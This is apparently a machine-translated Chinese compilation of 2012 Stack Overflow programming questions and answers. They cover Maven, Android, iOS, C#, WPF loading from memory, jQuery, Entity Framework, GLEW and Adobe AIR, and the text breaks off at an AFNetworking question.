我有一个 Maven 项目，它生成一个 WAR 文件并尝试从代码库中维护的 .properties 文件中的属性中获取工件版本。我还尝试使用自定义属性形成 WAR 文件的最终名称。

片段：

```
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">

  <modelVersion>4.0.0</modelVersion>

   ...

  <groupId>com.xyz.webapps</groupId>
  <artifactId>webapps</artifactId>
  <version>${info.version}-${application.env}</version>
  <packaging>war</packaging>
  <!-- Filling in the artifact version with properties read below -->

   ...

  <!-- Filling in the WAR name -->
   <properties>
     <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
     <maven.war.final.name>${pom.artifactId}-${pom.currentVersion}.war</maven.war.final.name>
     <maven.test.skip>true</maven.test.skip>
   </properties>

 ...

 <build>
   <plugins>

   ...

   <!-- I read those properties files here -->
   <plugin>
    <groupId>org.codehaus.mojo</groupId>
    <artifactId>properties-maven-plugin</artifactId>
    <version>1.0-alpha-2</version>
    <executions>
      <execution>
        <phase>validate</phase>
        <goals>
          <goal>read-project-properties</goal>
        </goals>
        <configuration>
          <files>
            <file>${project.basedir}/webapps-main/src/main/resources/MessageResources.properties</file>
            <file>${project.basedir}/build.properties</file>
          </files>
        </configuration>
      </execution>
    </executions>
  </plugin>

  ...

 </plugins>

...
</project> 
```

当我执行“mvn clean package”时，WAR 文件的名称会正确生成：

```
[INFO] Assembling webapp[webapps] in [/home/jubuntu/workspace/ui/new/webapps/target/webapps-2.8-qa]
[INFO] Processing war project
[INFO] Copying webapp resources[/home/jubuntu/workspace/ui/new/webapps/webapps-main/src/main/webapp]
[INFO] Webapp assembled in [4690 msecs]
[INFO] Building war: /home/jubuntu/workspace/ui/new/webapps/target/webapps-2.8-qa.war 
```

但是当我执行“mvn clean install”（或“mvn clean deploy”）时，由于某种原因属性不会扩展（包阶段仍然生成具有正确名称的WAR）：

```
[INFO] Building war: /home/jubuntu/workspace/ui/new/webapps/target/webapps-2.8-qa.war
[INFO] [install:install {execution: default-install}]
[INFO] Installing /home/jubuntu/workspace/ui/new/webapps/target/webapps-2.8-qa.war to /home/jubuntu/.m2/repository/com/xyz/webapps/webapps/${info.version}-${application.env}/webapps-${info.version}-${application.env}.war 
```

我在这里做错了什么吗？我将如何使这项工作用于安装和部署我的工件？我使用 Maven 版本 2.2.1 进行构建。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:20:34.103

你不能这样做。Maven 不支持它。这是基本的。

# android - 如何使用 Jelly Bean 在锁定屏幕上显示对话框

> ID：12429885
> 
> 赞同：3
> 
> 时间：2012-09-14T18:18:10.747
> 
> 标签：android

我有一个基于 Eclair 的应用程序，它在锁定的手机上显示全屏对话框。对话框出现，一旦对话框消失（因为用户点击了一个按钮），锁定的屏幕就会显示给用户，让他们输入密码。所有期望的行为。

这是有效的片段

```
getWindow().addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
setContentView(R.layout.alertdialog); 
```

当我在带有 Jelly Bean 的 Nexus 7 上安装此应用程序时，我没有得到相同的行为。平板电脑唤醒并显示锁定屏幕，供用户输入密码。锁定屏幕顶部不显示任何对话框。我输入了密码，但我仍然在任何地方都看不到对话框。在最近的版本中，完成相同行为的方式是否发生了变化？还有另一种方法可以做到这一点吗？

# ios5 - objc_release EXC_BAD_ACCESS

> ID：12429892
> 
> 赞同：1
> 
> 时间：2012-09-14T18:18:50.890
> 
> 标签：ios5, core-data, automatic-ref-counting, grand-central-dispatch, ios6

无法确定此错误发生了什么。

我正在分多个段上传文件。

我已将我的 api 调用线程化为 7 个并发线程。

这是它停止的汇编代码。

![汇编代码](../Images/52cf8d338872217f904e18b3a4f37874.png)

这是我打印的堆栈跟踪

![打印的堆栈跟踪](../Images/1a1bf8db29142842d5bd3561662dc4d6.png)

最后是堆栈窗口

![堆栈窗口](../Images/ea5bf90eafd977472debb86e0669b97b.png)

除了 dispatch_get_low() 的 #define 之外，我没有任何 DISPATCH_QUEUE_PRIORITY_LOW 并且我没有对 dispatch_get_low() 的任何调用

作为一点背景知识，我正在从 xcode 4.4 开发我的应用程序，最近安装了 GM Seed 4.5 以在 ios 6 上进行测试。我所有的代码仍然是 ios5，这个错误在 xcode 更新前后困扰着我。

**更新**

将 NSZombieEnabled YES 添加回我的环境变量后

![NSZombieEnabled 环境变量](../Images/c38f0c2e57f7c2f01481b85ee8371b11.png)

我以几乎相同的方式出现了一个不同的错误，但是这个错误被称为**转发**

装配断点

![断点组装](../Images/c8c55cac334de9917bd0858e9a175742.png)

堆栈跟踪打印输出

![堆栈跟踪打印输出](../Images/1759406f829264b04d0c8455d277088e.png)

调用堆栈窗口

![调用堆栈窗口](../Images/8dbcc5b4770e30edacffe9a083794b00.png)

我仍然不知道实际发生了什么。

我还在调查。任何进一步的帮助将不胜感激。

**==== 新发展 ====**

显然，在尝试获取 malloc 调用的一些输出时。我完全缓解了这个错误。

这令人沮丧，因为我认为我不能在启用此标志的情况下编译发布。

![在此处输入图像描述](../Images/bc68c159ae078d957c2cf511074e1a36.png)

EXC_BAD_ACCESS 不再出现，因此日志将无用。这个错误是我遇到过的最奇怪的问题，而且我遇到了很多奇怪的 iOS 错误。

*再次更新*

我一直在跟踪这个错误。原来有问题的对象是一个`-[CFNumber release]`调用该数字是在一个块中创建的，然后被传递给委托人。

它也可以与核心数据对象保存然后消失。

我添加了一个方法 HSLogBrute(@"") 记录行号和文件名。

我已将其追踪到以下代码。

```
 if (progressMatch > progressPercent){
        HSLogBrute(@"");
        TransferStatus *transferStatus = [TransferStatus objectByID:task.transferStatusID];
        HSLogBrute(@"");
        transferStatus.segmentsTransferred = [NSNumber numberWithInt:segmentsTransferred.intValue];
        HSLogBrute(@"");
        transferStatus.segmentsTotal = [NSNumber numberWithInt:segmentsTotal.intValue];
        HSLogBrute(@""); // This is the last log I am getting.
        [transferStatus save];
        HSLogBrute(@"");
    }
    HSLogBrute(@"");// Before putting in the [NSNumber numberWithInt:] calls this was the last line. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T23:11:06.883

原来我们正在创建一个 NSMutableDictionary 并在其中使用数字。像我们一样快地创建和销毁 NSNumbers 似乎在某些时候混淆了弧线。并且对象被无序地保留和释放。

我的解决方案是创建一个自定义对象，其中包含我需要的数字。并增加和减少这些原始数字类型，而不是创建和销毁这么多 NSNumber 值。

# c# - 为什么枚举中的位置标记（例如第一个或最后一个）被认为是不好的做法？

> ID：12429897
> 
> 赞同：5
> 
> 时间：2012-09-14T18:19:05.157
> 
> 标签：c#, enumeration

根据 System.Enum 类的 MSDN 文档的最佳实践部分：

> 不要仅仅为了反映枚举本身的状态而定义枚举值。例如，不要定义仅标记枚举结束的枚举常量。如果您需要确定枚举的最后一个值，请明确检查该值。此外，如果范围内的所有值都有效，您可以对第一个和最后一个枚举常量执行范围检查。

如果我理解正确，我们不应该如下声明枚举。

```
public enum DrawOrder
{
    VeryBottom = 0,
    Bottom = 1,
    Middle = 2,
    Top = 3,
    Lowest = VeryBottom, //marks a position in the enum
    Highest = Top, //marks a position in the enum
} 
```

为什么这被认为是不好的做法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T18:23:20.033

我不确定我是否同意这是不好的做法；这取决于。

Steve McConnell 的*Code Complete*使用了这种结构。（这本书开始显示它使用的语言的时代，所以这种技术在当时可能是*很好的*实践。）

不利的一面是，如果您更新枚举列表，还需要记住一件额外的事情：如果需要，更新`Highest`and/or的值`Lowest`。如果你忘记了，你会引入错误。

好处是你为循环编写的代码更快并且可以自我记录。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-14T18:24:01.783

因为如果你添加`VeryTop = 4`到枚举中，你必须记住更新`Highest`.

如果你不这样做，所有的地狱都会崩溃。经过一段时间（几个月）后，很容易忘记这一点。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-14T18:24:24.403

因为这些值可能会随着时间而改变。假设您将一个属性设置为（使用您的示例）`DrawOrder.Highest`并将其存储在您的数据库/文档/其他数据接收器中。

时间流逝。

代码更改。

您的`DrawOrder`枚举已获得更多值，并且您的持久数据中的值现在不再等于`DrawOrder.Highest`. 它仅等于`DrawOrder.Highest`数据被持久化时所映射的内容。

您认为这种情况有可能引起问题吗？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-14T18:31:33.390

我想说，如果您坚持枚举并且枚举可能会改变，那只是一个坏主意。如果你不坚持它，或者枚举没有改变的机会，那么在大多数情况下它可能没问题。但是标记的全部意义在于它的值可能会改变......所以它真的没有任何意义。

但是，在使用这样一种结构时需要小心，因为他们使用了他们实际想要的枚举。如果您的意思是 Top，但使用 Highest 代替...然后添加 SuperTop 并将 Highest 更改为此，那么您的初衷现在可能是一个错误。

仅当您想使用最高或最低的值时，才应使用 Marker 枚举，而不管其值如何。

很多人认为这是不好的做法，因为当你想要一个特定的值时使用标记真的很容易。

# bash - 在 bash 中生成键盘映射名称列表

> ID：12429898
> 
> 赞同：0
> 
> 时间：2012-09-14T18:19:09.320
> 
> 标签：bash, terminal

好的，所以...我想生成一个包含所有可用键盘映射的文件。我可以使用 LC_ALL 为语言环境执行此操作，但我不知道如何使用键盘映射自动执行此操作。

使用此命令，我可以获得正确的键盘映射名称（es.map.gz）

```
find /usr/share/kbd/keymaps -follow -name "*.gz" | sed 's|^.*/||g' | sort 
```

但我想知道是否有任何方法可以让“es.map.gz”用于“西班牙语”

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T22:22:34.507

线索就在文件名中，es 代表西班牙，我的 Linux 上没有这些文件，但在网上看到它并承认有些可能不那么直接，但在大多数情况下是国家代码。[http://fonlow.com/zijianhuang/kpa/trancountry.html](http://fonlow.com/zijianhuang/kpa/trancountry.html)

您还可以获取脚本到 gunzip 文件到 tmp 文件夹然后运行

```
strings es.map|head -100 |grep {for some pattern} 
```

在地图文件上运行字符串时，您可能会发现更多关于什么语言国家的线索

# jquery - 如何在调用 mouseup 后强制 jquery ui 可拖动重新启动

> ID：12429899
> 
> 赞同：1
> 
> 时间：2012-09-14T18:19:14.790
> 
> 标签：jquery, jquery-ui, draggable, jquery-ui-draggable

我有一个可拖动的 div ***#box***能够在更大的***#dashboard***内移动，我只能通过另一个 div 看到它，比***#window仪表板小***

这是顺序：
`<div id=’dashboard’&gt; <div id=’window’ > <div id=’box’ ></div> </div> </div>`

我正在寻找的是在***#box***到达***#window***的边界时重新创建自动缩放运动。因此，在窗口 mouseleave（拖动时）我绑定了一个 setInterval，它开始向相反方向移动***#dashboard***。

我注意到可拖动的***#box***停止移动，因为用户在退出窗口时停止移动鼠标（当他按住它时）期望移动自行继续。

***因此，我必须通过与#dashboard***相对的运动来强制可拖动的***#box***位置，以使其明显静止并靠近边界。

 ****这会在#box***和鼠标位置（在***#window***之外）之间创建一个距离，当鼠标再次开始移动时，它会将***#box***从该位置拖动（太糟糕了！）。

为了避免这种情况，我决定在鼠标离开***#window*** tiggering mouseup 时强制可拖动停止（我在论坛上阅读了这个并且它有效）。

现在我需要一种在鼠标重新进入***#window***时重新启动拖动的方法。我能怎么做？

* * *

**更新：**

我尝试用图像来解释这种情况：
![在此处输入图像描述](../Images/e8ff106d61b18a92ba659b5458128261.png)这里开始拖动，将框移到窗口外
![在此处输入图像描述](../Images/512dda53bbcea842a2cfa972b3b1011a.png)以滚动窗口，它必须开始向后移动（调用 setInterval()）
![在此处输入图像描述](../Images/f8f7c96be5d7b942c31d6ac1e20c6bfd.png)移动窗口会导致框自身向后移动，因为它有绝对位置
![在此处输入图像描述](../Images/0f20b7ef2205958d3c8472a54b09d32d.png)因此我必须将框重新定位在靠近窗口边框的位置，但这会导致框与窗口外的鼠标指针之间存在距离
![在此处输入图像描述](../Images/88447bfe770599b729e49ead02a53f1d.png)现在的问题：当再次移动鼠标并触发拖动事件时它“记住“与盒子的距离并神奇地移动它而不接触......

* * *

**更新 2：**

我创建了一个 jsFiddle 来显示所有代码：[这里](http://jsfiddle.net/UPFNU/)
要测试只是将***#box***移到右侧***#window***之外
，***#dashboard***将开始向后移动（停止它刚刚回到窗口内）。
不幸的是，发生了两件坏事：

1.  它将在鼠标指针和框之间创建一个距离，当您移回窗口时，框将从该距离拖动
2.  如果您继续将鼠标移到窗口外，该框将在其“*拖动位置*”和“*边框校正*”位置之间开始闪烁。

第二个问题可以避免`$("#box").trigger("mouseup");`在调用 setInterval 之前添加它，但它需要一种相反的功能，例如`$("#box").trigger("mousedown");`当鼠标重新进入窗口以再次触发拖动时，因此我的问题的标题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-16T10:24:29.530

根据“<em>Nal”的建议，我暂时解决了（因为我仍然希望有更好的解决方案）：

1.  当***#box***开始拖动时，它被替换为***#clone*** ( `display: none`on box)
2.  拖动时，如果 #clone 在可见的***#window内，则******#clone***将获取***#box***的`ui.position`
***   停止拖动***#box***将获得***#clone并在******移除 #clone***时`css('left')`重新出现 ( `display: block`) 。***

# javascript - 有没有做气球树布局的javascript图形绘制库？

> ID：12429906
> 
> 赞同：0
> 
> 时间：2012-09-14T18:19:39.303
> 
> 标签：javascript, apache-flex, graph-layout, graph-drawing, information-visualization

维基百科的条目说气球树布局是常见类型之一，但我找不到任何似乎支持开箱即用的 JavaScript 绘图库。我缺一个吗？一个便宜的或开源的 Flex/ActionScript 库也可以工作。我对图形绘制一无所知。使用 d3.js 之类的论文中的算法会很容易吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-20T15:33:23.493

我为我的大学荣誉项目实现了 d3 的气球布局。它目前在我的 d3 分支中，但我希望在荣誉高峰后的某个时间向上游发送拉取请求（前提是 d3 人想要它）。它绝对仍然是一项正在进行的工作，需要审查，但它就[在这里](https://github.com/justinvdm/d3/blob/add-balloon-layout/src/layout/balloon.js)。

你可以查看我使用它的[这个块。](http://bl.ocks.org/3676778)

# asp.net - 是否可以将实体映射到实体框架中存储过程的结果？

> ID：12429913
> 
> 赞同：1
> 
> 时间：2012-09-14T18:20:07.020
> 
> 标签：asp.net, asp.net-mvc, entity-framework, oop

我正在尝试在现有数据库上使用 Code First 设置实体框架。数据库状态不佳（命名约定不佳且需要一些约束）。我正在构建的应用程序是一个 MVC 应用程序。我有一个“模型”、“存储库”和“Web”（mvc）层。

要设置 EF 并映射我的模型对象（PO​​CO 对象），是否需要将我的对象与数据库表匹配？我可以改为使用自己的存储过程进行 CRUD 操作吗？如果我使用 WCF 数据服务会有帮助吗？

我计划使用流利的配置来映射我的对象，但由于数据库模式而存在一些问题。我知道考虑重新设计数据库只是为了让 EF 正确映射。任何建议将不胜感激！！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T18:49:13.177

看起来与这个问题非常相似：

[Entity Framework Code First 是否支持存储过程？](https://stackoverflow.com/questions/4845246/does-entity-framework-code-first-support-stored-procedures)

那里的答案可能对您有所帮助，以及围绕代码优先和存储过程如何没有很大意义的讨论。

哇，朱莉·勒曼回答了！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:25:43.543

是的，这是可能的，但不是特别容易。特别是，您必须调用`context.Database.SqlQuery<T>()`where T 是您要返回的实体类型，并且您的 SQL 必须与该实体类型匹配。否则，您将不得不将结果集按摩成一种类型。

通常，您将不得不手动完成大部分操作，尽管您可能会找到一个 T4 模板来为您生成它，或者可能使用其他一些工具，例如 CodeSmith。

# .net - 从内存中加载 WPF 应用程序

> ID：12429917
> 
> 赞同：4
> 
> 时间：2012-09-14T18:20:22.183
> 
> 标签：.net, wpf, reflection, reflector

这就是您在非 WPF 应用程序中调用 Main() 的方式：

```
var entry = assembly.EntryPoint;

if (assembly.EntryPoint.GetParameters().Length == 0)
    entry.Invoke(null, new object[0]);
else
    entry.Invoke(null, new object[] { args }); 
```

但不知何故，它对 WPF 应用程序根本不起作用，我尝试过（MSDN 的方式）：

```
Assembly asm = Assembly.LoadFrom(file);

Type myType = asm.GetType("WpfApplication1.App");

// Get the method to call.
MethodInfo myMethod = myType.GetMethod("Main");

// Create an instance.
object obj = Activator.CreateInstance(myType);

// Execute the method.
myMethod.Invoke(obj, null); 
```

仍然没有成功，Reflector 将 Main() 显示为

```
[DebuggerNonUserCode, STAThread]
public static void Main()
{
    App app = new App();
    app.InitializeComponent();
    app.Run();
} 
```

无论我做什么，我都会得到“System.Reflection.TargetInvocationException”异常。

有什么帮助吗？

PS。更多调试显示它无法加载最初位于我要加载的程序集中的“mainwindow.xaml”资源

```
{System.IO.IOException: Nie można zlokalizować zasobu „mainwindow.xaml”.
   w MS.Internal.AppModel.ResourcePart.GetStreamCore(FileMode mode, FileAccess access)
   w System.IO.Packaging.PackagePart.GetStream(FileMode mode, FileAccess access)
   w System.IO.Packaging.PackagePart.GetStream()
   w System.Windows.Application.LoadComponent(Uri resourceLocator, Boolean bSkipJournaledProperties)
   w System.Windows.Application.DoStartup()
   w System.Windows.Application.<.ctor>b__0(Object unused)
   w System.Windows.Threading.ExceptionWrapper.InternalRealCall(Delegate callback, Object args, Boolean isSingleParameter)
   w System.Windows.Threading.ExceptionWrapper.TryCatchWhen(Object source, Delegate callback, Object args, Boolean isSingleParameter, Delegate catchHandler)
   w System.Windows.Threading.Dispatcher.WrappedInvoke(Delegate callback, Object args, Boolean isSingleParameter, Delegate catchHandler)
   w System.Windows.Threading.DispatcherOperation.InvokeImpl()
   w System.Windows.Threading.DispatcherOperation.InvokeInSecurityContext(Object state)
   w System.Threading.ExecutionContext.runTryCode(Object userData)
   w System.Runtime.CompilerServices.RuntimeHelpers.ExecuteCodeWithGuaranteedCleanup(TryCode code, CleanupCode backoutCode, Object userData)
   w System.Threading.ExecutionContext.RunInternal(ExecutionContext executionContext, ContextCallback callback, Object state)
   w System.Threading.ExecutionContext.Run(ExecutionContext executionContext, ContextCallback callback, Object state)
   w System.Windows.Threading.DispatcherOperation.Invoke()
   w System.Windows.Threading.Dispatcher.ProcessQueue()
   w System.Windows.Threading.Dispatcher.WndProcHook(IntPtr hwnd, Int32 msg, IntPtr wParam, IntPtr lParam, Boolean& handled)
   w MS.Win32.HwndWrapper.WndProc(IntPtr hwnd, Int32 msg, IntPtr wParam, IntPtr lParam, Boolean& handled)
   w MS.Win32.HwndSubclass.DispatcherCallbackOperation(Object o)
   w System.Windows.Threading.ExceptionWrapper.InternalRealCall(Delegate callback, Object args, Boolean isSingleParameter)
   w System.Windows.Threading.ExceptionWrapper.TryCatchWhen(Object source, Delegate callback, Object args, Boolean isSingleParameter, Delegate catchHandler)
   w System.Windows.Threading.Dispatcher.WrappedInvoke(Delegate callback, Object args, Boolean isSingleParameter, Delegate catchHandler)
   w System.Windows.Threading.Dispatcher.InvokeImpl(DispatcherPriority priority, TimeSpan timeout, Delegate method, Object args, Boolean isSingleParameter)
   w System.Windows.Threading.Dispatcher.Invoke(DispatcherPriority priority, Delegate method, Object arg)
   w MS.Win32.HwndSubclass.SubclassWndProc(IntPtr hwnd, Int32 msg, IntPtr wParam, IntPtr lParam)
   w MS.Win32.UnsafeNativeMethods.DispatchMessage(MSG& msg)
   w System.Windows.Threading.Dispatcher.PushFrameImpl(DispatcherFrame frame)
   w System.Windows.Threading.Dispatcher.PushFrame(DispatcherFrame frame)
   w System.Windows.Threading.Dispatcher.Run()
   w System.Windows.Application.RunDispatcher(Object ignore)
   w System.Windows.Application.RunInternal(Window window)
   w System.Windows.Application.Run(Window window)
   w System.Windows.Application.Run()
   w WpfApplication1.App.Main()} 
```

所以我怀疑，问题是CLR试图在加载器应用程序中找到.xml，而不是在实际的wpf应用程序中。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-06-27T07:58:42.830

我找到了一种方法来做到这一点。你基本上有两个选择。

1.  在单独的 AppDomain 中加载 exe。
2.  使用反射技巧来更改默认 ResourceAssembly。

选项优先，虽然更干净，但缺点是速度较慢（WPF 也需要加载到新的 AppDomain 中）：

```
//Assembly: WpfLoader.dll
[STAThread]
class Program
{
    public class Loader : MarshalByRefObject
    {
        public void Load()
        {
            var dll = File.ReadAllBytes("WpfTest.exe");
            var assembly = Assembly.Load(dll);
            Application.ResourceAssembly = assembly;
            assembly.EntryPoint.Invoke(null, new object[0]);
        }

    }

    static void Main(string[] args)
    {
        var domain = AppDomain.CreateDomain("test");
        domain.Load("WpfLoader");

        var loader = (Loader)domain.CreateInstanceAndUnwrap("WpfLoader", "WpfLoader.Program+Loader");
        loader.Load();
    }
} 
```

第二种解决方案使用反射来更改当前应用程序的 ResourceAssembly。你不能使用公共 API 来做到这一点，因为`Application.ResourceAssembly`它只有在设置后才被读取。您必须使用反射来访问`Application`和`ResourceUriHelper`类的私有成员。

```
var dll = File.ReadAllBytes("WpfTest.exe");
var assembly = Assembly.Load(dll);

var app = typeof(Application);

var field = app.GetField("_resourceAssembly", BindingFlags.NonPublic | BindingFlags.Static);
field.SetValue(null, assembly);

//fix urihelper
var helper = typeof(BaseUriHelper);
var property = helper.GetProperty("ResourceAssembly", BindingFlags.NonPublic | BindingFlags.Static);
property.SetValue(null, assembly, null);

//load
assembly.EntryPoint.Invoke(null, new object[0]); 
```

这两种解决方案仍有一个警告：您不能在一个 AppDomain 中使用多个使用相关资源的 Wpf 应用程序，因此如果您希望加载多个应用程序，则需要创建多个`AppDomains`.

要使这些示例起作用，您需要做两件事：

*   它需要从单个appartment状态线程调用，所以记得使用`[STAThread]`
*   您需要添加 PresentationCore.dll、PresentationFramework.dll 和 WindowsBase.dll 引用

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-05-29T21:13:46.947

@ghord 的选项 2 非常好，但它需要一种方法来加载`*.dll`WPF 中的引用。

所以你还必须通过`App.xaml.cs`以下方式修改WPF的

```
public partial class App : Application
{
    protected override void OnStartup(StartupEventArgs e)
    {
        AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
        base.OnStartup(e);
    }
    private Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
    {
        string dir = @"C:\your\path\to\WPF\bin\Debug\";
        string fileExtension = "*.dll";
        string needed = args.Name.Split(',')[0];
        if (needed.EndsWith(".resources"))
        {
            return null;
        }
        foreach (String file in Directory.GetFiles(dir, fileExtension, SearchOption.TopDirectoryOnly))
        {
            string name = System.IO.Path.GetFileNameWithoutExtension(file);
            if (args.Name.StartsWith(name))
            {
                byte[] bytes = File.ReadAllBytes(file);
                Assembly assembly = Assembly.Load(bytes);
                return assembly;
            }
        }
        Debug.WriteLine(args.Name);

        return null;
    }
} 
```

该字符串`dir`可以设置为`Release`WPF 应用程序文件夹的路径。请注意，跳过 很重要，`.resources`但对于其余部分，我们可以假设在文件夹`*.dll`中找到了所有需要的`dir`文件。

顺便说一句，所有这一切都非常适合您的程序集的加密签名：例如阅读[我的文章](https://giuliohome.wordpress.com/2021/05/29/csharp-load-wpf-from-memory/)以了解如何加密您的 exe 和 dll 文件的签名。

## 速赢秘诀

假设您的启动器被命名`launcher.exe`并且原始 WPF 是并且您在项目文件夹下`mywfp.exe`定义了一个 WPF 窗口。现在您可能会遇到如下异常：`TestView``view`

```
System.Exception:
"The component 'mywfp.TestView' does not have a resource identified by the URI '/mywfp;component/view/testview.xaml'." 
```

这里的快速技巧是：

*   重命名`mywfp.exe`为`mywfp_original.exe`（或您喜欢）
*   将启动器重命名`launcher.exe`为原始 wpf，即`mywfp.exe`！

如果您想添加启动画面，请`Resource`在加载程序 exe 中包含带有构建操作的图像：在加载程序的 STA 线程中尽快显示它并在调用内存中加载应用程序的入口点之前将其关闭。

```
 SplashScreen splashScreen = new SplashScreen("splashscreen.jpg");
    splashScreen.Show(false); 
```

...

```
 splashScreen.Close(TimeSpan.FromSeconds(1));
    assembly.EntryPoint.Invoke(null, new object[0]); 
```

# html - 我需要从任何网站提取所有段落

> ID：12429918
> 
> 赞同：-1
> 
> 时间：2012-09-14T18:20:26.147
> 
> 标签：html, html-parsing

我需要获取任何随机网站并从网站中提取所有文本块。

我称之为“段落消歧”（参见维基百科中的“句子消歧”）。

我不在乎这些块本身是否包含其他 HTML，或者在我提取段落文本后我可以摆脱这些。

我还需要区分段落，这是第 1 段，这是第 2 段，依此类推。

我知道大多数段落通常包含在

标签。但情况并非总是如此。文本也可以包含在以下内容中：

```
<div>
<span>
<td>
<li> 
```

是否有任何其他可能包含文本块的 HTML 元素？

是否有任何其他方法可以从随机网页中提取文本块，例如寻找“白字”然后找到它们的边界？

提前致谢

杰夫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-16T06:51:09.703

使用 Python 的 Beautiful Soup 并在 body 元素上调用 .get_text() 。这将为您提供页面中的所有文本。

从[get_text() 上的文档](http://www.crummy.com/software/BeautifulSoup/bs4/doc/#get-text)：

```
>>> markup = '<a href="http://example.com/">\nI linked to <i>example.com</i>\n</a>'
>>> soup = BeautifulSoup(markup)
>>> soup.get_text()
u'\nI linked to example.com\n' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T18:26:35.130

几乎所有 HTML 元素都可能包含文本：

*   p
*   dt
*   dd
*   时间
*   th

还有很多我现在想不起来了。查看 HTML 标记的**[完整列表，](http://www.quackit.com/html/tags/)**看看哪些适合包含文本，哪些不适合。

# html - 浏览器 HTML 源代码不完整，即使已验证完整源代码已提供

> ID：12429926
> 
> 赞同：0
> 
> 时间：2012-09-14T18:20:53.907
> 
> 标签：html, ruby-on-rails, browser, loading

我遇到了最奇怪的问题。我有一个开发站点页面，对于某些用户来说，它在所有浏览器中都呈现不完整。查看源代码显示它在某个点被切断，在任何地方都没有结束 body 或 html 标记。但是，当向他们提供此页面时，在服务器上记录响应正文表明它是完整的。起初我认为这可能是网络问题，但在远离其他任何一个的多个位置都遇到过这个问题。同样奇怪的是，如果用户加载与静态页面而不是动态页面相同的完整源代码，则页面每次都正确呈现。我正在使用带有 Rack 1.1.3、Passenger 3.0.9 和 Nginx 1.0.6 的 Rails 2.3.8 仅供参考。有什么建议么？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-15T03:56:00.187

问题解决了。有一个大型 JSON 对象分配给页面上的一个变量，该对象用于各种字段的自动完成方法。在删除这个页面上的 JSON 对象并使用 jQuery getJSON() 方法从另一个 URL 加载它之后，问题就消失了。绝对是一个罕见的问题，但希望这对其他人有帮助。

# c++ - 基于 GLEW 的程序无法编译

> ID：12429932
> 
> 赞同：2
> 
> 时间：2012-09-14T18:21:21.707
> 
> 标签：c++, opengl, gcc, g++, glew

我正在尝试在我正在创建的程序中使用 GLEW，但我的编译器不会编译它，而是在这一行抛出大量错误`gcc -g -c glew.c -o glew.o`。这是我的**Makefile**：

```
MY_LIBS = 
glewex: glew.o main.o glew.h
    g++ main.o glew.o glew.h -o glewex $(MY_LIBS)
glew.o: glew.c
    gcc -g -c glew.c -o glew.o
main.o: main.cpp
    g++ -g -c main.cpp -o main.o 
```

它只是输出数百个如下所示的错误：

> __glewActiveTexture 在没有 dllimport 属性的情况下重新声明：先前的导入被忽略 [-Wattributes]

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-14T18:42:18.047

试试这个：

```
gcc -g -DGLEW_STATIC -c glew.c -o glew.o 
```

这应该防止 DLL 导入/导出装饰被添加到声明中。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-09-14T19:48:54.283

您不想将库源文件添加到项目的编译器输入中。您应该将库添加到链接器输入列表中；静态 (libglew.a) 或动态 (-lglew)。

即要么

```
gcc -o … -lglew 
```

或者

```
gcc -o … libglew.a 
```

静态链接 GLEW 时，您必须添加`-DGLEW_STATIC`生成编译单元（.o 文件）的编译器选项

# air - 在 Adob e AIR 中保存 iOS 上的位图数据

> ID：12429936
> 
> 赞同：0
> 
> 时间：2012-09-14T18:21:39.250
> 
> 标签：air

我有一个在 Adob​​e AIR 中开发并使用适用于 iOS 的 Flex SDk 4.6 编译的应用程序。该应用程序有一个模块，用户可以在其中将当前屏幕保存到应用程序存储。这工作正常，但保存图像大约需要 6-8 秒。

我正在使用 bitmapdata 来绘制舞台，然后使用 jpgencoder 将其转换为 bytearray，然后使用 File reference 将其保存到 apptorage。

有人可以告诉我这是捕获图像的正确且唯一的方法，还是在iOS上的AIR方面有更好的替代方法？

这是我的代码

```
 var bmp:BitmapData  =   new BitmapData(640,960,false,0)
        bmp.draw(this);
        //
        var je:JPGEncoder        =  new JPGEncoder();
        var b:ByteArray     =   je.encode(bmp);
        var saveFileName        =   String( new Date().milliseconds )  + ".jpg";
        var cropFile:File   =   appDir.resolvePath(saveFileName)

        var stream          =   new FileStream();
        stream.open(cropFile, FileMode.WRITE);                         

        stream.writeBytes(b,0,b.bytesAvailable);
        stream.close();
        bmp.dispose(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-16T13:50:42.117

如果你想减少捕获时间，也许你可以使用原生扩展。在 ios 上有一个名为 UIGetScreenImage 的 API。我认为它必须非常快。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T17:49:37.493

对于那些寻找解决方案的人，请访问[http://www.labs.saachitech.com/2012/10/12/capture-image-on-a-adobe-ios-application-and-save-to-ios-device -disk/](http://www.labs.saachitech.com/2012/10/12/capture-image-on-a-adobe-ios-application-and-save-to-ios-device-disk/)并下载 swc 和 ane 文件，以便在 iOS 设备上更快地保存位图数据。

# afnetworking - AFNetworking - setImageWithURL 返回 401

> ID：12429937
> 
> 赞同：1
> 
